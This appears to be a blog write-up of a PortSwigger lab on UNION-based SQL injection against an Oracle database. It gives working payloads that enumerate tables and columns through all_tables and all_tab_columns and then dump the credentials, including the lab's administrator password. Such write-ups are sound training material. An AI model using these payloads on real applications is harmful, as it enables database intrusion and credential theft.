---
layout: post
title: "SQL injection attack, listing the database content on Oracle"
date: 2026-09-01

categories:
  - Web Security

topic: SQL Injection

tags:
  - PortSwigger
  - SQL Injection
  - Web Security Academy

toc: true
---

# Lab: SQL injection attack, listing the database contents on Oracle

## Lab Information

- **Platform:** PortSwigger Web Security Academy
- **Tool:** Burp Suite
- **Difficulty:** Practitioner
- **Vulnerability:** SQL Injection
- **Status:** Solved ✓

## Lab Objective

This lab contains a SQl injection vulnerability in the product category filter.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

The main objective of this lab is to login as administrator.

   
## Testing (How I know that this lab has sql-injection vulnerability?)

I put ``` ' ``` in product category filter URL, it gave me **Internal server error** which specify that something is broke in backend. 
And I got to know that this product category field has sql-injection vulnerability. 


## Exploitation

### Note: On Oracle database, every **SELECT** statement must specify a table to select **FROM**.
 If your **UNION SELECT** statement does not querying from a table, you will still need to include the **FROM** keyword followed by a valid table name.
 There is a built-in table on Oracle called **dual** for this purpose.
 For example:
 
 ```sql
 UNION SELECT 'abc' FROM dual
 ```
 we are going to use this **FROM dual** concept for determining numbers of column and datatype of column.

### 1. Determine the number of columns
 The first step for UNION based attack is to determine the number of column.
 Query for determining column number is:

 ```sql
 'UNION SELECT NULL,NULl from dual--
 ```

 To know more about determining number of column read my previous lab:
 [Read my determining number of columns post](/blog/2026/08/27/sql-injection-numbers-of-column/)

 In this lab the number of columns are **2**.

### 2. Determine the datatype of each column
 The second step is determining datatype of column, if it is text or number or NULL.
  
 ```sql
 'UNION SELECT 'text','text'from dual--
 ```
 To know more about determining datatype of column read my previous lab:
 [Read my determining datatype of column post](/blog/2026/08/27/sql-injection-column-containing-text/)

 In this lab both column are of **text** datatype.

### 3. Determine the name of the table

 Query for determining the name of the table is 
 ```sql
 SELECT * FROM all_tables
 ```
 To know more about querying Database table name. Read 
  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

 The final payload for determine the name of the table is: 

 ```sql
 'UNION SELECT NULL, table_name FROM all_tables--
 ```
 This query returns lists of the table name.
 HERE the table name is **USERS_KCTZRK**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-content-Oracle1.png)


### 4. Determine the username and password column name under **USERS_KCTZRK** table

 Query for determining the column name of the table is 
 ```sql
 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
 ```
 To know more about querying Database column name of tables. Read 
  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

 The final payload for determine the column name of the table is: 

 ```sql
 'UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_KCTZRK'--
 ```
 This query returns lists of the column name.
 HERE the username and password columns are **USERNAME_FWAYUJ** and **PASSWORD_ZKBGSS**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-content-Oracle2.png)


### 5. Listing the username and password under USERS_KCTZRK table

 Using the query, 

 ```sql
 'UNION SELECT USERNAME_FWAYUJ, PASSWORD_ZKBGSS from USERS_KCTZRK--
 ```
 I retrieve all username and password list containing administrator user and it's password.
 The password for administrator user is **mu9jx3wun2mrrh2r507i**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-content-Oracle3.png)


## Result

After filling 

administrator user and its password **mu9jx3wun2mrrh2r507i** in login function I successfully login as administrator user.


![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-content-Oracle4.png)


## Key Takeaways

-Oracle uses specific system tables and views to store database metadata.
- The all_tables view can be used to identify tables accessible to the current user.
- The all_tab_columns view provides information about columns within accessible tables.
- Understanding Oracle's metadata structure helps map the database schema during SQL injection testing.
- Parameterized queries and proper input validation are important defenses against SQL injection.

**Lab Status: Solved ✓**